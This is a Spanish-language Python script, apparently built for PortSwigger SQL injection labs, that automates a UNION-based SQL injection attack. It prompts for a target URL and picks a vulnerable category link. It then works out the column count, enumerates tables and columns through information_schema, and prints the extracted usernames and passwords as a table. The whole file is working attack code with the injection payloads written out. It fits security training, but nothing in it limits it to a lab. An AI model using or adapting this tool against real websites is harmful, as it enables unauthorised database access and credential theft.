import requests
import sys
import urllib3
from bs4 import BeautifulSoup
from art import text2art
from colorama import init, Fore


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def obtener_respuesta(params):
    url = params['url']
    try:
        peticion = requests.get(url)
        return peticion
    except requests.ConnectionError:
        print("La URL es inválida, Terminando la ejecución de la aplicación.")
        sys.exit(-1)

def obtener_enlace_ataque(params):
    url = params['url']
    peticion = obtener_respuesta(params)
    html = peticion.text
    soup = BeautifulSoup(html, 'html.parser')
    section = soup.findAll('section')
    section_filtros = section[len(section)-1]
    enlaces = section_filtros.findAll('a')
    print(Fore.BLUE + "\n[+] " + Fore.GREEN + "Lista de enlaces de interes:\n" + Fore.RESET)
    for i in range(1,len(enlaces)):
        print (str(i) + ". " + enlaces[i].contents[0])
    print(Fore.BLUE+"\n¿Desde que enlace desea realizar el ataque?: "+Fore.RESET, end="")
    enlace_ataque = int(input())
    return enlaces[enlace_ataque]['href']
    
def obtener_numero_columnas_tabla(params):
    url, path = params['url'], params['path']
    i=1
    sql_payload = "'+UNION+SELECT+NULL"
    while True:
        peticion = requests.get(url+path[1:]+sql_payload+"-- - ", verify=False)
        if peticion.status_code // 100 ==  2:
            print(Fore.BLUE + "\n[+]" + Fore.GREEN + "Información obtenida:\n" + Fore.RESET)
            print(Fore.BLUE + "[+]" + Fore.GREEN + " Numero de columnas: %i" % i + Fore.RESET)
            return i 
        sql_payload = sql_payload+",NULL"
        i+=1
    return False

def diferencia_listas(lista_a, lista_b):
    if len(lista_a) > len(lista_b):
        lista_grande = lista_a
        lista_pequena = lista_b
    else:
        lista_grande = lista_b
        lista_pequena = lista_a
    
    lista_diferencias = []
    
    for elemento in lista_grande:
        if elemento not in lista_pequena:
            lista_diferencias.append(elemento)
            
    return lista_diferencias


def recuperar_lista_tablas(params):
    url, path, n_columnas = params['url'], params['path'], params['n_columnas']
    
    sql_payload = "'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--"
    respuesta_normal = requests.get(url + path[1:])
    respuesta_vulnerada = requests.get(url + path[1:] + sql_payload)
    
    lista_th_normal = BeautifulSoup(respuesta_normal.text, 'html.parser').find_all('th')
    lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, 'html.parser').find_all('th')
    
    lista_th_exploited = diferencia_listas(lista_th_normal,lista_th_vulnerada)
    
    return lista_th_exploited

    
def tabla_a_consultar(params):
    lista_tablas = params['lista_tablas']
    
    print(Fore.BLUE + "\n[+]" + Fore.GREEN + "Listado de tablas de la base de datos:\n" + Fore.RESET)
    
    tablas = []
    
    for tabla in lista_tablas:
        tablas.append(tabla.get_text())
        
    presentar_tablas(tablas)
        
    print(Fore.BLUE + "\nIngrese el numero de la tabla: " + Fore.RESET, end="")
    id_tabla = int(input())
    return (id_tabla - 1)

def detalles_columnas(params):
    url, path, lista_tablas, id_tabla = params['url'], params['path'], params['lista_tablas'], params['id_tabla']
    nombre_tabla = lista_tablas[id_tabla].get_text()
    sql_payload = "'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='"+nombre_tabla+"'-- - "
    
    respuesta_normal = requests.get(url + path[1:])
    respuesta_vulnerada = requests.get(url + path[1:] + sql_payload)
    
    lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, 'html.parser').find_all('th')
    lista_th_normal = BeautifulSoup(respuesta_normal.text, 'html.parser').find_all('th')
    
    lista_columnas = diferencia_listas(lista_th_normal,lista_th_vulnerada)
    
    print(Fore.BLUE + "[+]" + Fore.GREEN + " Columnas de la tabla: " + nombre_tabla + "\n" + Fore.RESET)       
    
    for i in range(1,len(lista_columnas)+1):
        print(str(i) + ": " + lista_columnas[i-1].get_text())
        
    return lista_columnas
    
def consultar_columnas(params):
    
    url, path, lista_tablas, id_tabla, lista_columnas = params['url'], params['path'], params['lista_tablas'], params['id_tabla'], params['lista_columnas']
    
    print(Fore.BLUE + "\nIngrese las columnas a consultar" + Fore.RESET)
    
    print(Fore.BLUE + "Columna 1: " + Fore.RESET, end="")
    columna_1 = int(input()) 
    
    print(Fore.BLUE + "Columna 2: " + Fore.RESET, end="")
    columna_2 = int(input())
    
    nombre_tabla = lista_tablas[id_tabla].get_text()
    
    nombre_columna_1 = lista_columnas[columna_1-1].get_text()
    nombre_columna_2 = lista_columnas[columna_2-1].get_text()
    
    sql_payload = "'+UNION+SELECT " + nombre_columna_1 + "," + nombre_columna_2 + " FROM " + nombre_tabla + "-- -"
    
    respuesta_normal = requests.get(url + path[1:])
    respuesta_vulnerada = requests.get(url + path[1:] + sql_payload)
    
    lista_tr_vulnerada = BeautifulSoup(respuesta_vulnerada.text, 'html.parser').find_all('tr')
    lista_tr_normal = BeautifulSoup(respuesta_normal.text, 'html.parser').find_all('tr')
    
    lista_diferencias = []
    print()
    for elemento in lista_tr_vulnerada:
        if elemento not in lista_tr_normal:
            lista_diferencias.append(elemento)

    print(Fore.BLUE + "[+] " + Fore.GREEN + "Resultados de consultar la tabla: " + nombre_tabla + Fore.RESET + "\n")
    
    # Obtén la longitud máxima de usuario y contraseña
    longitud_maxima_usuario = max(len(elemento.find_all('td')[0].get_text()) for elemento in lista_diferencias)
    longitud_maxima_contrasena = max(len(elemento.find_all('th')[0].get_text()) for elemento in lista_diferencias)

    # Imprime la línea de encabezado de la tabla
    print(f"+{'-' * (longitud_maxima_usuario + 2)}+{'-' * (longitud_maxima_contrasena + 2)}+")

    # Imprime los encabezados de la tabla
    print(f"| {'Usuario':<{longitud_maxima_usuario}} | {'Contraseña':<{longitud_maxima_contrasena}} |")

    # Imprime la línea de separación
    print(f"+{'-' * (longitud_maxima_usuario + 2)}+{'-' * (longitud_maxima_contrasena + 2)}+")

    # Imprime las filas de la tabla
    for elemento in lista_diferencias:
        usuario = elemento.find_all('td')[0].get_text()
        contrasena = elemento.find_all('th')[0].get_text()
        print(f"| {usuario:<{longitud_maxima_usuario}} | {contrasena:<{longitud_maxima_contrasena}} |")

    # Imprime la línea de cierre de la tabla
    print(f"+{'-' * (longitud_maxima_usuario + 2)}+{'-' * (longitud_maxima_contrasena + 2)}+")
        
def presentar_tablas(tablas):
        # Calcular el número de elementos en cada columna
    presentar_tablas_columnas = 2
    elementos_por_columna = len(tablas) // presentar_tablas_columnas
    if len(tablas) % presentar_tablas_columnas != 0:
        elementos_por_columna += 1

    # Dividir las tablas en dos columnas
    columnas = [tablas[i:i + elementos_por_columna] for i in range(0, len(tablas), elementos_por_columna)]

    # Calcular el ancho de columna para el formato
    ancho_columna = max(len(f"{i}. {elemento}") for i, fila in enumerate(zip(*columnas), start=1) for elemento in fila)

    # Obtener el número total de elementos en ambas columnas
    total_elementos = len(tablas)

    # Imprimir las tablas en dos columnas con números y espacio entre ellas
    for i in range(max(len(col) for col in columnas)):
        for j, columna in enumerate(columnas):
            if i < len(columna):
                # Calcular el índice
                indice = i + 1 + j * elementos_por_columna
                # Imprimir el elemento con formato
                print("{:<{}}".format(f"{indice}. {columna[i]}", ancho_columna), end="")
            if j < len(columnas) - 1:
                print("  " * (presentar_tablas_columnas - 1), end="")
        print()
        
def bienvenida():
    init() 

    # Crear arte ASCII para "SQL Injection"
    title_art = text2art("SQL Injection")

    print("\n" + "*"*80)
    # Imprimir el título en color amarillo
    print(Fore.YELLOW + title_art + Fore.RESET)

    # Descripción en color azul fuerte
    print(Fore.BLUE + "\n\t\tUna herramienta para realizar SQL UNION attack\n" + Fore.RESET)

    # Mensaje adicional con referencia al repositorio
    print(Fore.BLUE + "[+] Repo: "+ Fore.RESET, end="")
    print(Fore.GREEN + "https://github.com/SebastianCastilloDev/portswigger-python-scripts\n" + Fore.RESET)
    print("*"*80)
    
    
def main():
    bienvenida()
    params = {}
    
    print(Fore.BLUE + "Ingrese la url a atacar: "+ Fore.RESET, end="")
    url_base = input()
    
    
    params['url'] = url_base
    
    # determinar numero de columnas
    if obtener_respuesta(params):
        print(Fore.BLUE + "\n[+]" + Fore.GREEN+" URL válida. Procediendo con la ejecución del script..." + Fore.RESET)
    
    params['path'] = obtener_enlace_ataque(params)
    
    params['n_columnas'] = obtener_numero_columnas_tabla(params)
    
    # recuperar la lista de tablas
    params['lista_tablas'] = recuperar_lista_tablas(params)
    
    # encontrar el nombre de la tabla que contiene credenciales de usuario
    params['id_tabla'] = tabla_a_consultar(params)
    
    # recuperar detalles de las columnas de la tabla
    params['lista_columnas'] = detalles_columnas(params)
    
    # Encontrar el nombre de las columnas que contienen usuarios y passwords
    consultar_columnas(params)
    
    
if __name__ == "__main__":
    main()
